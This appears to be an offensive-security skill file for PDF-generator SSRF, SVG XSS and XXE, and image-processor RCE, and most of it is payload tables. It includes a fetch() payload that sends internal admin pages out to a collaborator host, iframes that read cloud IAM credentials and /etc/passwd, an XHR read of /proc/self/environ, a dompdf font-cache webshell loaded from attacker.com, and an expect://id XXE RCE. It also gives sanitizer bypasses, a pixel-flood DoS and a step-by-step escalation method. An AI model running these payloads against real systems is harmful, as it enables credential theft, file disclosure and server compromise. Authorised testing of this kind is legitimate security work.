---
name: pdf-svg-injection
description: PDF generation SSRF, SVG XSS/XXE, and server-side rendering exploitation
depends_on: [ssrf, xss, xxe]
---

# PDF/SVG Injection & Server-Side Rendering Exploitation

PDF generators are full HTML/JS engines running on the server. SVG is XML that executes JavaScript. Any feature labeled "Generate PDF," "Export Report," or "Upload Image" is a candidate for SSRF, XSS, XXE, LFI, or RCE depending on the backend renderer.

## Discovery Signals

| # | Signal | Where to Find | Why Vulnerable |
|---|--------|---------------|----------------|
| 1 | `wkhtmltopdf` in PDF metadata `Producer`/`Creator` field | `exiftool output.pdf` on any downloaded PDF | QtWebKit+JS engine, runs as server user, often no network sandbox |
| 2 | `HeadlessChrome` or `Puppeteer` User-Agent in OOB callback | Collaborator logs after injecting `<img src=http://collab/>` | Full Chrome JS execution in server network context |
| 3 | `/api/*/export`, `/generate-pdf`, `/print`, `/receipt` endpoints | Path scan, feature enumeration | HTML-to-PDF pipeline accepts user-controlled content |
| 4 | SVG upload accepted (avatar, icon, logo, product image) | Upload forms, content-type probing | SVG = XML with script execution and external entity support |
| 5 | `PhantomJS` in headers/errors or timing >3s on PDF generation | Error messages, response timing | Legacy headless browser, JS execution, unmaintained since 2018 |
| 6 | Invoice/certificate/ticket/packing-slip generation feature | Feature scan, admin panels, e-commerce flows | User input flows into HTML template rendered server-side to PDF |
| 7 | Image resize/thumbnail that accepts SVG (even via content sniffing) | Upload probe: SVG body with `.png` extension | ImageMagick/librsvg dereference `xlink:href` before rasterization |
| 8 | `data:image/svg+xml` accepted in rich text editors | RTE source inspection, paste from clipboard | Base64-encoded SVG with embedded JS executes on direct navigation |
| 9 | Self-hosted PDF.js (`/pdfjs/web/viewer.html`, `/assets/pdfjs/`) | Path scan, JS bundle grep | Vendored PDF.js with known CVEs (CVE-2024-4367) |
| 10 | Screenshot/preview service for user-supplied URLs or themes | Feature scan, admin theme previews | Headless browser renders user HTML in internal network context |
| 11 | `Content-Disposition: inline` on served SVG files | Download response headers on uploaded SVG | Browser renders SVG inline with full script execution in app origin |
| 12 | Office doc preview generating thumbnails server-side | Upload DOCX/PPTX, observe thumbnail generation | LibreOffice/Aspose resolve external relationships at render time |

## Attack Surface

- **PDF generation endpoints**: export, print, invoice, receipt, certificate, report, packing slip, dashboard snapshot
- **SVG upload surfaces**: avatar, icon, logo, product image, custom graphic, markdown image embed, RTE attachment
- **Image processing pipelines**: thumbnailing, resizing, watermarking, format conversion, metadata stripping
- **Document rendering**: Office preview, email HTML render, markdown-to-HTML, template preview, link preview/OG card
- **File serving endpoints**: direct download, inline preview, CDN-served user content, embed/iframe views

## PDF Generation SSRF

### Library Behavior Matrix

| Library | Default Behavior | SSRF Possible? | JavaScript? | Known Bypass |
|---------|-----------------|----------------|-------------|--------------|
| wkhtmltopdf | Renders HTML via QtWebKit, fetches all resources | YES - img/iframe/link/fetch | YES - full JS | `file:///etc/passwd` via iframe often works out of the box |
| Puppeteer/Chrome | Headless Chromium, fetches all resources | YES - full browser fetch | YES - full Chrome | `--no-sandbox` flag = any Chrome RCE becomes host RCE |
| PhantomJS | Legacy QtWebKit, minimal sandboxing | YES - same as wkhtmltopdf | YES | `file://` usually works, no modern security model |
| PrinceXML | Custom CSS renderer, no JS engine | YES - CSS url(), @import, link | NO | CSS-only exfil via `@import url()`, `background-image: url()` |
| WeasyPrint | Python CSS renderer, no JS | YES - CSS url(), img, link | NO | `file://` depends on config; CSS SSRF always works |
| dompdf | PHP renderer, fetches remote CSS/fonts | YES - link, @font-face, img | NO | Font-cache write to PHP webshell (CVE-2022-28368) |
| TCPDF | PHP renderer, limited external fetch | Limited - img src only | NO | No direct file://, but external image fetch = blind SSRF |
| mPDF | PHP renderer, fetches img/CSS | YES - img, annotation tag | NO | LFI via `<annotation file="/etc/passwd">` |
| ReportLab | Python, programmatic API (no HTML input) | Rare - only if app passes URLs | NO | Attack surface is in app code wrapping ReportLab, not the library |
| jsPDF | Client-side JS library (runs in browser) | NO server SSRF | N/A (client) | Not an SSRF target; check if output reflects into server-side DOM |
| Gotenberg | Chromium-backed API service | YES - full Chromium surface | YES | `--allow-file-access-from-files` misconfig enables file:// read |

### HTML-to-PDF Injection Payloads

| Payload | Target | What It Fetches | Library |
|---------|--------|-----------------|---------|
| `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` | AWS IMDSv1 credentials | IAM role + temp credentials | wkhtmltopdf, PhantomJS, Puppeteer |
| `<script>fetch('http://internal:8080/admin').then(r=>r.text()).then(t=>fetch('http://collab/?d='+btoa(t)))</script>` | Internal services | Response body exfiltrated via OOB | Any JS-enabled renderer |
| `<link rel="stylesheet" href="http://collab/">` | Blind SSRF probe | Confirms server-side fetch (even without JS) | All renderers including PrinceXML, WeasyPrint |
| `<style>@font-face{font-family:x;src:url("http://collab/")}</style>` | Blind SSRF via font fetch | OOB callback confirms renderer | Most CSS-capable renderers |
| `<iframe src="file:///etc/passwd" width="800" height="600">` | Local file read | File content rendered into PDF | wkhtmltopdf, PhantomJS |
| `<script>x=new XMLHttpRequest;x.open("GET","file:///proc/self/environ");x.onload=function(){document.body.innerText=this.responseText};x.send()</script>` | Environment variables | AWS keys, DB credentials, secrets | wkhtmltopdf (XHR to file:// works) |
| `<annotation file="/etc/passwd" content="" icon="Graph" title="x" pos-x="195" />` | Local file read (mPDF-specific) | File content as PDF annotation | mPDF only |
| `<style>@font-face{font-family:e;src:url("http://attacker.com/evil.php")}</style><p style="font-family:e">x</p>` | dompdf font-cache RCE | Caches attacker PHP as .php in webroot | dompdf <1.2.1 (CVE-2022-28368) |
| `<meta http-equiv="refresh" content="0;url=http://collab/">` | Auth header leak | Headless browsers carry internal headers through redirect | Puppeteer, Chrome headless |
| `<embed src="http://localhost:9222/json" type="text/html">` | Chrome DevTools endpoint | Lists all open tabs with URLs and WebSocket debug endpoints | Puppeteer with `--remote-debugging-port` |

## SVG Exploitation

### SVG XSS Vectors

| Context | Payload | Bypass Technique | Works On |
|---------|---------|------------------|----------|
| Direct SVG upload served inline | `<svg onload="fetch('https://collab/')">` | None needed if Content-Disposition: inline | Any app serving SVG with `image/svg+xml` |
| SVG foreignObject | `<svg><foreignObject><body onload="alert(1)">` | Embeds full HTML inside SVG namespace | Browsers rendering SVG directly |
| SVG use+data URI | `<svg><use href="data:image/svg+xml;base64,PHN2Zy..."/>` | Payload hidden in base64; sanitizer sees opaque string | Rails SafeListSanitizer ($2,400 IBB bounty) |
| SVG CDATA script | `<svg><script><![CDATA[alert(1)]]></script></svg>` | CDATA wrapper hides `<script>` from text-scanning sanitizers | XML-aware renderers |
| SVG animate event | `<svg><animate onbegin="alert(1)">` | Event handler on animation element, not on svg tag | Modern browsers |
| SVG set attribute | `<svg><set attributeName="onmouseover" to="alert(1)">` | Declarative animation sets event handler at runtime | Chrome, Firefox |
| Math+style parser confusion | `<math><style><img src=x onerror=alert(1)>` | Foreign-content tag shifts parser mode, breaks sanitizer allowlist | Rails CVE-2022-23519 ($2,400 bounty) |
| Extension mismatch SVG | SVG body uploaded as `.png` with `Content-Type: image/svg+xml` | Validator checks extension, renderer sniffs content | ImageMagick, librsvg, browser content sniffing |

### SVG XXE Vectors

| Payload | Target | Exfil Method | Parser |
|---------|--------|-------------|--------|
| `<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg><text>&x;</text></svg>` | Local file read | Entity expanded into SVG text, rendered visually | libxml2-backed parsers (librsvg, ImageMagick) |
| `<!DOCTYPE svg [<!ENTITY x SYSTEM "http://169.254.169.254/">]><svg><text>&x;</text></svg>` | Cloud metadata SSRF | Entity fetches internal URL, content in rendered output | Same as above |
| `<!DOCTYPE svg [<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">%dtd;]>` | OOB file exfil | External DTD triggers parametric entity chain to attacker | PHP SimpleXML, Java SAX (pre-hardened) |
| `<!DOCTYPE svg [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>` | PHP wrapper file read | Base64-encoded content avoids XML parsing errors | PHP libxml2 with entity resolution enabled |
| `<!DOCTYPE svg [<!ENTITY x SYSTEM "expect://id">]><svg><text>&x;</text></svg>` | RCE via PHP expect wrapper | Command output in rendered text | PHP with expect extension installed |
| `<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///proc/self/environ">]><svg><text>&x;</text></svg>` | Environment variable leak | AWS keys, DB passwords from process environment | Linux servers with entity resolution |

### SVG SSRF Vectors

| Element | Attribute | Target | Example |
|---------|-----------|--------|---------|
| `<image>` | `xlink:href` | Internal service or cloud metadata | `<image xlink:href="http://169.254.169.254/latest/meta-data/"/>` |
| `<use>` | `href` | External SVG fragment load | `<use href="http://internal/admin#fragment"/>` |
| `<feImage>` | `href` | Lesser-known filter-based SSRF | `<filter><feImage href="http://internal:8080/"/></filter>` |
| `<style>` | `@import` | CSS-based blind SSRF | `<style>@import url("http://collab/")</style>` |
| `<script>` | `href` | External script load (if not CSP-blocked) | `<script href="http://attacker/payload.js"/>` |
| `<a>` | `xlink:href` | Redirect/navigation SSRF (on click) | `<a xlink:href="http://internal/"><rect width="100%" height="100%"/></a>` |

## Image Processing Attacks

| Library | Attack | Payload | Impact |
|---------|--------|---------|--------|
| ImageMagick | ImageTragick delegate execution (CVE-2016-3714) | MVG/MSL format with shell metacharacters in filename | RCE as web server user |
| ImageMagick | Ghostscript delegation via PostScript header | `%!PS` header in `.gif`-named file triggers GS delegate | RCE via Ghostscript CVEs ($5,000 Basecamp bounty) |
| ImageMagick | MSL protocol chain via SVG xlink:href | SVG references `msl:/path/to/exploit.msl` which writes PHP webshell | RCE on ownCloud/similar (write to webroot) |
| ImageMagick | Arbitrary file read via PNG tEXt (CVE-2022-44268) | Crafted PNG with `tEXt profile` chunk pointing to target file | LFI: read /etc/passwd, config files, source code |
| Ghostscript | `-dSAFER` sandbox bypass (CVE-2017-8291, CVE-2018-16509) | PostScript `.eqproc` operator or `pipe%` device escape | RCE from EPS/PS uploaded as image ($5,000 Semrush bounty) |
| Ghostscript | Filter-chain memory corruption (CVE-2023-28879) | Chained `*Encode filter` calls corrupt function pointer | RCE via PIL/Pillow EPS processing on web apps |
| ExifTool | DjVu metadata Perl eval (CVE-2021-22204) | DjVu annotation with backslash-newline eval injection | RCE on GitLab via image upload ($20,000 bounty) |
| librsvg | Uninitialized memory leak on malformed SVG | Crafted SVG triggers uninit-memory read during render | AWS keys and session cookies in rasterized output ($8,868 Basecamp) |
| Pillow/PIL | EPS processing delegates to Ghostscript | Any EPS file processed by `EpsImagePlugin.py` reaches GS | Ghostscript CVE surface via Python image libraries |
| Sharp/libvips | SVG processing with external references | SVG `xlink:href` to internal URLs during resize/convert | SSRF from Node.js image processing pipelines |

## Defense-Bypass Pairs

| Defense | Bypass Technique | Real Example |
|---------|-----------------|--------------|
| Extension allowlist blocks `.svg` | SVG body uploaded as `.png`/`.gif`; renderer content-sniffs | Basecamp RCE: PostScript as `.gif` ($5,000) |
| JS disabled in PDF renderer | CSS `@import`, `<link>`, `@font-face src:url()` fire outbound requests | PrinceXML/WeasyPrint CSS-only SSRF in multiple programs |
| Input HTML sanitizer strips `<script>` | `<img src=x onerror="...">` or `<svg onload="...">` event handlers | DoD PDF SSRF via onerror in form field ($4,000) |
| SVG sanitizer strips `onload` | DOCTYPE entity declaration shifts parser mode | `<!DOCTYPE svg [<!ENTITY x "">]><svg onload="alert(1)">` |
| CSP blocks inline scripts | CSP not applied to `image/svg+xml` Content-Type responses | Framework applies CSP to text/html only, not SVG |
| `data:` URIs blocked in `src` | `<svg><use href="data:image/svg+xml;base64,...">` dereferences in SVG namespace | Rails SafeListSanitizer bypass ($2,400) |
| ImageMagick policy.xml blocks SVG | PostScript with `%!PS` magic header bypasses format restriction | Semrush RCE: ImageMagick delegates to GS on magic-byte match |
| Same-origin check on PDF.js `?file=` param | "Open file" UI feature and drag-and-drop bypass URL gating | SignalPath CVE-2024-4367 XSS ($10,000 Google VRP) |
| Content-Type validation on upload | Filename `.png` + actual SVG body; TOCTOU between validator and renderer | Multiple programs: validator checks extension, renderer checks bytes |
| Separate content-serving origin | Admin theme/template preview renders in app origin, not content origin | Screenshot services running in same origin as admin panel |
| dompdf patched font extension to `.ttf` | Polyglot font/phar file + phar:// deserialization (CVE-2022-41343) | Incomplete CVE-2022-28368 patch chained with phar:// bypass |

## Chain Patterns

| Base Finding | Chain With | Combined Impact | Example |
|-------------|-----------|-----------------|---------|
| HTML injection in form field | PDF generation SSRF | Cloud metadata credential theft | DoD FAST tool: form input -> PDF -> AWS IMDSv1 ($4,000) |
| Reflected XSS on static page | dompdf font-cache write | RCE via PHP webshell in font cache | Positive Security 0day: XSS -> CSS injection -> font cache -> RCE |
| SVG upload SSRF | File-existence oracle via two-URL chain | Library fingerprinting for targeted CVE | Probe `/usr/share/doc/*/examples/*.png` to inventory packages |
| ImageMagick delegation | Ghostscript sandbox escape | Full RCE from image upload | Basecamp/Semrush: `.gif` extension -> GS delegate -> shell ($5,000) |
| SVG XSS via data:URI in RTE | Open-in-new-tab navigation | Same-origin JS execution -> admin ATO | Shopify: base64 SVG in img src, open in new tab ($5,300) |
| PDF.js vendored CVE | Clickjacking on upload UI | Stored XSS in application origin | SignalPath: CVE-2024-4367 + no X-Frame-Options ($10,000) |
| Screenshot service renders user URL | JS redirect in rendered HTML | Internal auth header leak to OOB | Headless Chrome carries X-ABS-App-Token through navigation |
| ExifTool DjVu eval injection | Any image upload with metadata stripping | RCE as git user on GitLab | CVE-2021-22204: DjVu annotation Perl eval ($20,000) |

## Known CVEs in Renderers and Processors

| CVE | Component | Impact | Payload Signature |
|-----|-----------|--------|-------------------|
| CVE-2022-28368 | dompdf <1.2.1 | RCE via font-cache PHP write | `@font-face{src:url("http://attacker/evil.php")}` |
| CVE-2022-41343 | dompdf 2.0.0 | RCE via phar:// deserialization (incomplete patch of above) | Polyglot font/phar file + `phar://` wrapper bypass |
| CVE-2024-4367 | PDF.js (pre-mid-2024) | XSS via font-matrix eval | Crafted PDF with malicious FontMatrix glyph data |
| CVE-2017-8291 | Ghostscript | RCE via `-dSAFER` bypass | PostScript `.eqproc` operator / `pipe%` device |
| CVE-2018-16509 | Ghostscript | RCE via `null restore` sandbox escape | `{ null restore } stopped { pop } if` + `%pipe%` OutputFile |
| CVE-2023-28879 | Ghostscript | RCE via filter-chain memory corruption | Chained `*Encode filter` calls corrupt function pointer |
| CVE-2016-3714 | ImageMagick (ImageTragick) | RCE via delegate execution | MVG/MSL format with shell metacharacters |
| CVE-2022-44268 | ImageMagick | Arbitrary file read via PNG tEXt chunk | Crafted PNG with `tEXt profile` pointing to target file |
| CVE-2021-22204 | ExifTool <12.24 | RCE via DjVu metadata Perl eval | DjVu annotation with `\<newline>` breaking eval quotes |

## Key Vulnerabilities

### Font-Cache Write to RCE (dompdf)
CSS `@font-face` with `src:url()` pointing to attacker server causes dompdf to fetch and cache a file with attacker-controlled content and extension. When `isRemoteEnabled=true` (common) and the font cache is web-accessible (default), the cached file retains `.php` extension from the URL, creating a webshell at a predictable path. Confirmed 0day affecting dompdf v0.8.5 through v1.2.0. The incomplete patch (forcing `.ttf` extension) was bypassed via phar:// deserialization (CVE-2022-41343) because phar:// ignores file extensions.

### Headless Browser DevTools Exposure
Chromium-based renderers with `--remote-debugging-port=9222` expose an unauthenticated DevTools Protocol on localhost. Injecting `<iframe src="http://localhost:9222/json">` from within rendered HTML reveals all open tabs' URLs and WebSocket endpoints. This leaks every concurrent user's rendered document content. The `--no-sandbox` flag compounds the risk: any Chrome renderer RCE becomes immediate host code execution.

### Extension-Mismatch Delegate Chain
ImageMagick/GraphicsMagick dispatch to backend converters based on file content magic bytes, not extension. A PostScript file named `.gif` routes to Ghostscript, which has a history of sandbox escape CVEs. This pattern has yielded RCE on Basecamp, Semrush, and ownCloud. Defense requires both magic-byte allowlisting AND keeping delegate libraries patched.

### SVG-in-Image Pipeline Memory Disclosure
Server-side SVG renderers (librsvg, ImageMagick) with uninitialized-memory bugs leak heap contents -- including AWS credentials and session cookies -- into rasterized output pixels. Attackers upload many crafted SVGs, download rendered PNGs, and grep pixel data for secret patterns. Each render leaks different heap bytes, so bulk upload and aggregation is the technique.

### Packing-Slip and Invoice Template Injection
HTML injection in e-commerce packing slips and invoices enables CSS-based layout manipulation of printed physical documents. Attackers inject `display:none` on the real shipping address and substitute their own, causing warehouse staff to ship goods to attacker-controlled addresses. No JS needed -- CSS layout attacks work on all PDF renderers.

## Testing Methodology

1. **Enumerate all PDF/document generation surfaces**: export, print, invoice, receipt, certificate, report, packing slip, dashboard snapshot, admin preview
2. **Fingerprint the generator**: download any produced PDF, run `exiftool` to extract `Creator`/`Producer` metadata
3. **Probe renderer capabilities**: inject `<img src="http://COLLAB/">` in every field that appears in PDF output; note User-Agent in callback
4. **Test JS execution**: `<script>document.write('JS_WORKS')</script>` in rendered field; check if text appears in PDF
5. **Test CSS-only SSRF**: `<link rel="stylesheet" href="http://COLLAB/">` works on all renderers including those with JS disabled
6. **Test file access**: `<iframe src="file:///etc/hostname">` for wkhtmltopdf/PhantomJS; `<annotation file="/etc/passwd">` for mPDF
7. **SVG upload testing**: upload directly, then with extension mismatch (`.png` with SVG body), then via content-type override
8. **SVG XXE probe**: `<!DOCTYPE svg [<!ENTITY x SYSTEM "http://COLLAB/">]><svg><text>&x;</text></svg>`
9. **Protocol enumeration**: replace `http://` with `file://`, `gopher://`, `dict://`, `ftp://` in all payloads
10. **Escalate**: SSRF to cloud metadata, file read to credentials, JS execution to internal service enumeration

## Validation

| Evidence | Confirms | Severity Signal |
|----------|----------|-----------------|
| OOB callback with internal User-Agent header | SSRF from server network context | Medium+ |
| Cloud metadata (IAM creds) in PDF or OOB exfil | Credential theft via SSRF | Critical |
| `/etc/passwd` or `/proc/self/environ` in PDF | Local file read via renderer | High |
| `alert(1)` fires in browser on served SVG | Stored XSS in application origin | Medium-High |
| Entity resolution on SVG upload (OOB callback) | XXE via SVG parser | Medium-High |
| dompdf font-cache PHP file accessible in webroot | RCE via file write chain | Critical |
| ImageMagick delegates to Ghostscript (timing/error) | Delegate-based RCE surface | High-Critical |
| SVG two-URL chain proves file existence on server | File-existence oracle for targeted exploitation | Medium (recon primitive) |
| PDF.js version pre-dates known CVE fix | Vendored library XSS | Medium-High |
| SVG served from app origin with `Content-Disposition: inline` | Stored XSS via file serving misconfiguration | Medium-High |

## False Positives

| Pattern | Why It Looks Like a Vuln But Isn't |
|---------|-----------------------------------|
| Client-side PDF generation (jsPDF, pdf-lib) | JS runs in user's browser, not server; no SSRF. But check if output reflects into server DOM |
| SVG served with `Content-Disposition: attachment` + `nosniff` | Forces download, no inline rendering. Verify on ALL serving paths |
| SVG inside `<img>` tag only | Browsers sandbox SVG in img; no script execution. But "open in new tab" breaks the sandbox |
| PDF.js with strict CSP `script-src 'none'` on viewer | CSP blocks CVE payloads. Verify CSP applies to the viewer path specifically |
| SVG converted to PNG server-side before serving | Rasterization strips all XML. But SSRF may fire during conversion |
| Renderer with `--no-javascript` flag confirmed | CSS-only attacks still possible but JS escalation blocked | Report CSS SSRF at lower severity |
| Self-XSS in own PDF template preview | Attacker can only XSS themselves | Check for HMAC/OAuth sign-in flows that flip identity context |
| SVG outbound request but cloud metadata blocked at network level | SSRF confirmed but impact limited | Still valid for internal service discovery and port scanning |

## Impact

- **PDF SSRF to cloud metadata**: IAM credential theft, S3 access, lateral movement across cloud accounts
- **PDF LFI**: config files, environment variables, source code, database credentials
- **SVG stored XSS**: session hijack, admin account takeover, data theft in application origin
- **Image processor RCE**: full server compromise via ImageMagick/Ghostscript/ExifTool delegate chains
- **dompdf/Ghostscript RCE**: remote code execution on PHP/Python/Ruby servers processing user uploads
- **Memory disclosure**: AWS keys and user cookies leaked via uninitialized heap in renderer output

## Pro Tips

1. **Always `exiftool` every PDF the target produces.** `Creator`/`Producer` reveal the exact generator. `wkhtmltopdf 0.12.x` = jackpot (JS + file:// + no sandbox).

2. **CSS-only SSRF works on every renderer.** `<link>`, `@import`, `@font-face{src:url()}`, `background-image:url()` fire even with JS disabled. Test these first.

3. **Upload SVG as every allowed image extension.** Extension allowlists without magic-byte validation are worthless. Try `.png`, `.jpg`, `.gif` with SVG body.

4. **Two-URL SVG chain for file-existence oracle.** `<image xlink:href="file:///TARGET"/>` + `<image xlink:href="http://collab/"/>` -- second fires only if first resolves. Fingerprint installed libraries by probing `/usr/share/doc/*/examples/*.png`.

5. **Check redirect behavior for header leaks.** Headless browsers carry internal auth headers through redirects. Always check full headers in collaborator, not just the request.

6. **Regression hunt disclosed SVG/PDF fixes.** Re-test prior reports with parser-differential variants. Fixes get reverted during refactors.

7. **dompdf font-cache chain is still live on unpatched installs.** CVE-2022-28368 affects any PHP app using dompdf with `isRemoteEnabled=true` and web-accessible font cache (both common defaults).

8. **Test all foreign-content + raw-text tag pairs against sanitizers.** When `svg+style` is patched, try `math+style`, `svg+textarea`, `math+title`. Deny-combination lists are reactive and incomplete.

9. **Pixel flood DoS on image processors.** A 65535x65535 PNG header in a tiny file decompresses to ~12GB RAM. Any image upload that thumbnails/resizes without pixel-area limits is vulnerable. Prove cross-tenant impact (other users get 502) to demonstrate severity beyond self-DoS.

10. **Audit every file-serving endpoint for three headers.** `Content-Type` must not be `image/svg+xml` or `text/html` for user uploads; `Content-Disposition` must be `attachment`; `X-Content-Type-Options` must be `nosniff`. Failure at any layer on any serving path = stored XSS.

## Summary

PDF/SVG injection exploits the gap between "it's just a document" and "the server runs a full browser to render it." Every PDF export, image upload, and document preview is a potential SSRF, XSS, LFI, or RCE surface depending on which renderer processes the input and how its network and filesystem access is sandboxed.
